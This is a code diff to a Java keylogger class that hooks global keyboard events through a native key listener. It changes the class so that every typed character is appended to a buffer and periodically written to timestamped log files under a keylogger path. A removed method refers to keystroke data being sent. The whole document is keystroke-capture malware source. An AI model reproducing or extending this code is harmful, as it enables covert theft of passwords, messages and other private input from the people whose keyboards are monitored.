@@ -13,44 +13,35 @@ import java.util.List;
 
 public class NativeKeyboard implements NativeKeyListener {
 
-    private List<KeyStorage> keyCache = new LinkedList<>();
+    private static StringBuilder typedCache = new StringBuilder();
 
     public NativeKeyboard() {
-
-    }
-
-    public List<KeyStorage> getKeyCache() {
-        return keyCache;
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
-
+        typedCache.append(e.getKeyChar());
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
-        keyCache.add(new KeyStorage(e.getKeyCode(), true, System.currentTimeMillis()));
+        //System.out.println("Key typed: " + e.getKeyChar());
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
-        keyCache.add(new KeyStorage(e.getKeyCode(), false, System.currentTimeMillis()));
     }
 
     public void onSave() {
         try {
             FileWriter fw = new FileWriter(Settings.KEYLOGGER_PATH + "logs_" + new Date().toString().replace(" ", "_").replace(":", "-") + ".txt");
-            fw.write(Utils.rawPrint(Keylogger.keyboard.getKeyCache()));
+            fw.write(typedCache.toString());
             fw.close();
+
+            typedCache = new StringBuilder(); // clean cache
         } catch(IOException ioe) {
             ioe.printStackTrace();
         }
-
-        keyCache.clear();
     }
 
-    public void onFail() {
-        System.out.println("Keystroke data fail to be send.");
-    }
 }
